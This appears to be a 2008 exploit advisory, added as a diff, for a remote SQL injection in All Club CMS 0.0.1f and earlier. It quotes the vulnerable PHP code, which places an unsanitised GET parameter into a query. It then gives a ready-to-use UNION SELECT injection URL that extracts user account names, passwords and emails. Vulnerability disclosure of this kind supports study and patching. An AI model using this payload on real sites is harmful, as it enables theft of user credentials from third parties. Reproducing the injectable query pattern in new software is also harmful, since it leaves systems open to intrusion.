@@ -1,0 +1,51 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+ All Club CMS <= 0.0.1f index.php Remote SQL Injection Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+
+bug found by ka0x
+D.O.M TEAM 2008
+we are: ka0x, an0de, xarnuz
+http://www.domlabs.org/
+
+Script affected: All Club CMS
+Vulnerability: Remote SQL Injection
+
+Download: http://sourceforge.net/project/showfiles.php?group_id=209058
+need magic_quotes_gpc = off
+
+
+vuln code:
+
+[...]
+
+if (isset($_GET['name']) && (!(empty($_GET['name'])))) {
+   
+  $name = $_GET['name'];
+  $name = stripslashes($name);
+  // stop hackers
+  if (eregi("http\:\/\/", $name)) {
+      echo "<br />&nbsp;&nbsp;No go on the hack attempt.<br />";
+      // log attempt, from IP, etc.
+      if ($SYS_SET['ban_attack_ip']) {
+        // ban ip if ban_attack_ip
+      }
+    die();
+  }
+   
+  $sth = $dbh->prepare("SELECT * FROM accms_modules WHERE name='$name'");
+ 
+[...]
+
+
+Stripslashes function only deletes backslashes (\) and the backslashes
+doubles (\\) becomes simple (\).
+
+
+Exploit:
+http://[host]/accms_path/index.php?name=-1'/**/union/**/select/**/1,concat(account,0x3a,password,0x3a,email),3,4,5,6,7,8,9,1,1,1,1/**/from/**/accms_users/**/where/**/id=1/*
+
+
+__EOF__
+
+# milw0rm.com [2008-02-05]
